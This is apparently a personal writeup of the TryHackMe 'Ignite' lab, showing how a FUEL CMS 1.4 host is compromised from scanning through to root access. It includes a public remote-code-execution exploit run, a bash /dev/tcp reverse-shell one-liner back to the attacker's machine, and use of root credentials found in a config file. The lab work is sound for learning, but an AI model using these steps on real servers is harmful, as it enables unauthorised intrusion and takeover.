---
title: "Ignite Writeup THM"
description: "My writeup of the TryHackMe room [Ignite](https://tryhackme.com/room/ignite)"
date: 2024-01-10
image: https://images.unsplash.com/photo-1546182208-1e70985e2bf3?q=80&w=2592&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
categories:
    - Room
    - Easy
---

I am going to start with a nmap scna:

```bash
nmap -sC -sV 10.10.10.167
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-05 11:40 EST
Nmap scan report for 10.10.10.167
Host is up (0.057s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.67 seconds
```

We see that it has a web page running on “FUEL CMS”

![Untitled](https://raw.githubusercontent.com/Blueaulo/Ignite-writeup-THM/main/8a3dca11-ee82-426e-a7dc-155184a6b3cf_Export-dee501f9-607d-4822-af96-36e7c2ca8801/Ignite%2088fddc3b17754ab58e830bf5d61a5987/Untitled.png)

We see that it’s running version 1.4 which is vulnerable.

From the nmap scan we also know that it has the robots.txt and fuel directories:

```bash
User-agent: *
Disallow: /fuel/
```

![Untitled](https://raw.githubusercontent.com/Blueaulo/Ignite-writeup-THM/main/8a3dca11-ee82-426e-a7dc-155184a6b3cf_Export-dee501f9-607d-4822-af96-36e7c2ca8801/Ignite%2088fddc3b17754ab58e830bf5d61a5987/Untitled%201.png)

Now I am going to use an exploit that works with fuel cms 1.4:

https://www.exploit-db.com/exploits/50477:

```bash
python3 50477.py -u http://10.10.10.167/
[+]Connecting...
Enter Command $whoami
systemwww-data
```

Ok now I am going to start a proper reverse shell.

`bash -i >& /dev/tcp/10.11.65.91/4444 0>&1`

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.65.91] from (UNKNOWN) [10.10.113.174] 34452
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

From there I just searched the web directory, and found the config folder.

In there there was a file named database.php, which contains the root credentials

```bash
su root
Password:

root@ubuntu:/var/www/html/fuel/application/config# whoami
root
```
